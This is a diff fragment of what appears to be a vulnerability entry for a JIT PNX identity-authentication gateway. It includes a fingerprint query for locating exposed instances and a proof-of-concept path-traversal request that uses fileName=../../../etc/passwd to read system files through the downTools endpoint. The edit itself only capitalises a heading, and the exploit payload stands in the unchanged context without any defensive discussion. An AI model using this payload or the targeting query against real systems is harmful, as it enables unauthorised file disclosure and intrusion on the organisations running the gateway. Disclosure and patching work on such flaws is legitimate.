@@ -8,7 +8,7 @@
 body="/jit_pnx_portal/" || header="server: jit_pnxcore1 web service" || title="吉大正元身份认证网关"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /jit_pnx_portal/downTools?fileName=../../../../../../../../../etc/passwd HTTP/1.1
